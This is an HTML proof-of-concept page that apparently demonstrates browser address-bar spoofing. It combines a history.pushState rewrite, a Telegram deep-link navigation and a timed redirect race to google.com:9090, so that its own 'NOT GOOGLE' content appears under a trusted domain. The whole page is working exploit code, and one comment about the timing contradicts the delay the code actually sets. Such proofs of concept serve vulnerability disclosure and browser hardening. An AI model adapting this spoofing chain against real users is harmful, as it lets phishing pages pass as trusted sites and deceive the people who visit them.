<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 16px;
  padding: 12px 18px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  max-width: 420px;
  margin: 100px auto;
  background: #fff;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

#spoof {
  display: none;
  margin-top: 20px;
  font-size: 28px;
  font-weight: 600;
  color: #b00020;
}
</style>
</head>

<body>

<div id="panel">
  <button onclick="start()">Start</button>
  <div id="spoof">NOT GOOGLE</div>
</div>

<script>
const spoof = document.getElementById('spoof');

function start() {
  /* history manipulation */
  history.pushState({}, '', '/trusted');

  /* open Telegram */
  setTimeout(() => {
    location.href = 'tg://resolve?domain=telegram';
  }, 200);

  /* tampilkan NOT GOOGLE setelah 3 detik */
  setTimeout(() => {
    spoof.style.display = 'block';
  }, 1900);
}

/* navigation race */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
